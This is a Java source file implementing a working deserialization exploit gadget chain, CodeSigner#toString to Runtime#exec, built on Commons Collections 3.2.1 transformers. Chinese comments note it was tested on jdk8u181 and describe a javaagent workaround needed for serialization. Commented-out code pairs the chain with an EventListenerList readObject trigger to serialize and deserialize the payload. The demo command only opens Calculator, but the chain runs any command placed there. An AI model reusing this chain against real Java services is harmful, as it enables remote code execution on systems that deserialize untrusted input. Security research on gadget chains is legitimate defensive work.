package com.xiinnn.tostring2exec;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.list.LazyList;
import org.apache.commons.collections.list.TransformedList;
import org.apache.commons.collections.map.ListOrderedMap;
import sun.misc.Unsafe;
import sun.security.provider.certpath.X509CertPath;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Field;
import java.security.CodeSigner;
import java.util.*;

// CodeSigner#toString -> Runtime#exec
// 实测：jdk8u181 commons-collections#3.2.1
// 序列化时需搭配CodeSignerToString2execAgent将CertPath#writeReplace方法删除，否则会序列化失败
// 序列化时，需要带上VM选项 -javaagent:/path/to/test-1.0-SNAPSHOT.jar
// 直接调用下方toString验证无需使用Agent删除方法
public class CodeSignerToString2exec {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(null);
        List transformedList = TransformedList.decorate(arrayList, chainedTransformer);
        List lazyList = LazyList.decorate(transformedList, new ConstantFactory(chainedTransformer));
        HashMap<Object, Object> map = new HashMap<>();

        ListOrderedMap decorated = (ListOrderedMap) ListOrderedMap.decorate(map);
        setFieldValue(decorated, "insertOrder", lazyList);

        X509CertPath x509CertPath = (X509CertPath) getObjectByUnsafe(X509CertPath.class);
        setFieldValue(x509CertPath, "certs", lazyList);

        CodeSigner codeSigner = (CodeSigner) getObjectByUnsafe(CodeSigner.class);
        setFieldValue(codeSigner, "signerCertPath", x509CertPath);
        codeSigner.toString();

        // 推荐搭配下方 EventListenerList#readObject -> toString
//        EventListenerList eventListenerList = new EventListenerList();
//        UndoManager manager = new UndoManager();
//        Vector vector = (Vector) getFieldValue(manager, "edits");
//        vector.add(codeSigner);
//        setFieldValue(eventListenerList, "listenerList", new Object[]{InternalError.class, manager});
//
//        byte[] exp = ser(eventListenerList);
//        unser(exp);
    }
    public static Object getObjectByUnsafe(Class clazz) throws Exception{
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        return unsafe.allocateInstance(clazz);
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static Field getField(Class<?> clazz, String fieldName) {
        Field field = null;

        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException var4) {
            if (clazz.getSuperclass() != null) {
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }
        return field;
    }
    public static byte[] ser(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unser(byte[] exp) throws ClassNotFoundException, IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(exp);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
